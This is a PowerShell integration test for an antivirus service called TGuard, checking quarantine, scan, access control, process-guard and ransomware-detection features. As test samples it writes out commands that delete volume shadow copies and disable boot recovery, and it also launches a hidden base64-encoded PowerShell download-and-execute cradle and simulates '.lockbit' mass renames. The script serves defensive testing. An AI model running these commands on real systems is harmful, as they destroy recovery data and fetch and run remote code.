param([string]$ServiceExe = "publish/service/TGuard.Service.exe")

$ErrorActionPreference = 'Stop'

function Send-TGuard([string]$cmd, $arguments = $null) {
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'TGuard.Service.v1', [System.IO.Pipes.PipeDirection]::InOut)
    $pipe.Connect(5000)
    $w = New-Object System.IO.StreamWriter($pipe); $w.AutoFlush = $true
    $r = New-Object System.IO.StreamReader($pipe)
    $req = @{ cmd = $cmd }
    if ($arguments) { $req.args = $arguments }
    $w.WriteLine(($req | ConvertTo-Json -Compress -Depth 5))
    $line = $r.ReadLine()
    $pipe.Dispose()
    return $line | ConvertFrom-Json
}

$proc = Start-Process -FilePath $ServiceExe -PassThru -NoNewWindow
try {
    $ok = $false
    for ($i = 0; $i -lt 30 -and -not $ok; $i++) {
        Start-Sleep -Seconds 1
        try { $s = Send-TGuard 'status'; $ok = $s.ok } catch { }
    }
    if (-not $ok) { throw 'Service did not answer the status request.' }
    Write-Host "Status: $($s.data | ConvertTo-Json -Compress)"
    if (-not $s.data.realtimeEnabled -or $s.data.watchedFolders -lt 1) { throw 'Real-time protection is not active.' }

    $downloads = Join-Path $env:USERPROFILE 'Downloads'
    New-Item -ItemType Directory -Force -Path $downloads | Out-Null
    $file = Join-Path $downloads 'tguard_test_cleanup.cmd'
    $bad = '@echo off' + "`r`n" + 'vssadmin' + ' delete shadows /all /quiet' + "`r`n" + 'bcdedit /set {default}' + ' recoveryenabled no'
    Set-Content -Path $file -Value $bad -Encoding ascii

    $caught = $false
    for ($i = 0; $i -lt 20 -and -not $caught; $i++) {
        Start-Sleep -Seconds 1
        $caught = -not (Test-Path $file)
    }
    if (-not $caught) { throw 'Real-time protection did not quarantine the test file.' }

    $q = Send-TGuard 'quarantine.list'
    if (-not ($q.data | Where-Object { $_.originalPath -like '*tguard_test_cleanup.cmd' })) { throw 'Test file is not in quarantine.' }
    $ev = Send-TGuard 'events'
    Write-Host "Events: $(@($ev.data).Count)"

    $deny = Send-TGuard 'settings.set' @{ realtimeEnabled = $false }
    if ($deny.ok) { throw 'SECURITY FAILURE: settings change accepted from an untrusted client.' }
    Write-Host "Untrusted request rejected: $($deny.error)"
    $st2 = Send-TGuard 'status'
    if (-not $st2.data.realtimeEnabled) { throw 'Real-time protection was turned off by an untrusted client.' }
    $deny2 = Send-TGuard 'quarantine.delete' @{ id = 'x' }
    if ($deny2.ok) { throw 'SECURITY FAILURE: quarantine.delete accepted from an untrusted client.' }

    $js = Join-Path $downloads 'tguard_test_invoice.js'
    Set-Content -Path $js -Value 'var x = 1;' -Encoding ascii
    Set-Content -Path "$($js):Zone.Identifier" -Value "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=http://185.22.1.9/cgd/fatura.js" -Encoding ascii
    $found = $false
    for ($i = 0; $i -lt 20 -and -not $found; $i++) {
        Start-Sleep -Seconds 1
        $ev = Send-TGuard 'events'
        $found = [bool](@($ev.data) | Where-Object { $_.target -like '*tguard_test_invoice.js' })
    }
    if (-not $found) { throw 'Download origin (Mark-of-the-Web) was ignored.' }
    $e = @($ev.data) | Where-Object { $_.target -like '*tguard_test_invoice.js' } | Select-Object -First 1
    Write-Host "MOTW: $($e.verdict) $($e.score) - $($e.reasons -join ' | ')"

    $scanDir = Join-Path $env:TEMP 'tguard-scan-test'
    New-Item -ItemType Directory -Force -Path $scanDir | Out-Null
    Set-Content -Path (Join-Path $scanDir 'ok.txt') -Value 'nothing to see here' -Encoding ascii
    Set-Content -Path (Join-Path $scanDir 'bad.cmd') -Value $bad -Encoding ascii
    $denied = Send-TGuard 'scan.start' @{ type = 'custom'; paths = @('C:\Windows\System32') }
    if ($denied.ok) { throw 'An untrusted client was allowed to start a custom scan.' }
    $start = Send-TGuard 'scan.start' @{ type = 'quick' }
    if (-not $start.ok) { throw "scan.start failed: $($start.error)" }
    $done = $null
    for ($i = 0; $i -lt 300 -and -not $done; $i++) {
        Start-Sleep -Seconds 1
        $p = Send-TGuard 'scan.progress'
        if (-not $p.data.running) { $done = $p.data }
    }
    if (-not $done) { throw 'Quick scan did not finish.' }
    Write-Host "Scan: $($done.filesScanned) files, $($done.threats) threat(s)"
    if ($done.filesScanned -lt 2) { throw 'Quick scan did not scan anything.' }
    $q = Send-TGuard 'quarantine.list'
    if (-not (@($q.data) | Where-Object { $_.originalPath -like '*tguard-scan-test*bad.cmd' })) { throw 'The test threat was not quarantined.' }
    $st3 = Send-TGuard 'status'
    if (-not $st3.data.lastScan) { throw 'Last scan date was not saved.' }

    if (-not $st3.data.processGuardActive) { throw 'Process guard is not active.' }
    $payload = 'Start-Sleep -Seconds 25; IEX (New-Object Net.WebClient).DownloadString(''http://127.0.0.1:9/a.ps1'')'
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    $ps = Start-Process -FilePath powershell.exe -ArgumentList @('-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', $b64) -PassThru
    $killed = $false
    for ($i = 0; $i -lt 15 -and -not $killed; $i++) {
        Start-Sleep -Seconds 1
        $killed = $ps.HasExited
    }
    if (-not $killed) { Stop-Process -Id $ps.Id -Force; throw 'Process guard did not terminate the malicious PowerShell.' }
    $ev = Send-TGuard 'events'
    $pe = @($ev.data) | Where-Object { $_.source -eq 'process' } | Select-Object -First 1
    if (-not $pe) { throw 'No process event was recorded.' }
    Write-Host "Process guard: $($pe.headline) - $($pe.action)"

    $ok = Start-Process -FilePath powershell.exe -ArgumentList @('-NoProfile', '-Command', 'Start-Sleep -Seconds 6') -PassThru
    Start-Sleep -Seconds 3
    if ($ok.HasExited) { throw 'Process guard killed a harmless PowerShell (false positive).' }
    $docs = [Environment]::GetFolderPath('MyDocuments')
    $canary = Join-Path $docs '!tguard-protegido.docx'
    if (-not (Test-Path -LiteralPath $canary)) { throw 'Ransomware decoy file was not created.' }
    $attr = (Get-Item -LiteralPath $canary -Force).Attributes
    if (-not ($attr -band [IO.FileAttributes]::Hidden)) { throw 'Ransomware decoy file is not hidden.' }
    [IO.File]::WriteAllBytes($canary, [byte[]](1..200))
    $rw = $null
    for ($i = 0; $i -lt 15 -and -not $rw; $i++) {
        Start-Sleep -Seconds 1
        $rw = @((Send-TGuard 'events').data) | Where-Object { $_.source -eq 'ransomware' } | Select-Object -First 1
    }
    if (-not $rw) { throw 'Changing a ransomware decoy was not detected.' }
    Write-Host "Ransomware: $($rw.headline) - $($rw.reasons -join ' | ')"
    if ($PID -and -not (Get-Process -Id $PID -ErrorAction SilentlyContinue)) { throw 'The test shell was killed.' }

    $burstDir = Join-Path $docs 'tguard-burst-test'
    New-Item -ItemType Directory -Force -Path $burstDir | Out-Null
    1..20 | ForEach-Object { Set-Content -Path (Join-Path $burstDir "doc$_.docx") -Value "file $_" -Encoding ascii }
    Start-Sleep -Seconds 6
    $before = @(@((Send-TGuard 'events').data) | Where-Object { $_.source -eq 'ransomware' }).Count
    Get-ChildItem $burstDir -Filter *.docx | ForEach-Object { Rename-Item $_.FullName ($_.Name + '.lockbit') }
    $after = $before
    for ($i = 0; $i -lt 15 -and $after -le $before; $i++) {
        Start-Sleep -Seconds 1
        $after = @(@((Send-TGuard 'events').data) | Where-Object { $_.source -eq 'ransomware' }).Count
    }
    if ($after -le $before) { throw 'Mass encryption (rename burst) was not detected.' }
    Remove-Item $burstDir -Recurse -Force

    $normalDir = Join-Path $docs 'tguard-normal-test'
    New-Item -ItemType Directory -Force -Path $normalDir | Out-Null
    Start-Sleep -Seconds 6
    1..30 | ForEach-Object { Set-Content -Path (Join-Path $normalDir "notes$_.txt") -Value "note $_" -Encoding ascii }
    Get-ChildItem $normalDir -Filter *.txt | ForEach-Object { Rename-Item $_.FullName ($_.BaseName + '.md') }
    Get-ChildItem $normalDir | Remove-Item -Force
    Start-Sleep -Seconds 4
    $final = @(@((Send-TGuard 'events').data) | Where-Object { $_.source -eq 'ransomware' }).Count
    if ($final -ne $after) { throw 'Normal file activity was reported as ransomware (false positive).' }
    Remove-Item $normalDir -Recurse -Force

    Write-Host 'Service OK.' -ForegroundColor Green
}
finally {
    Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
}
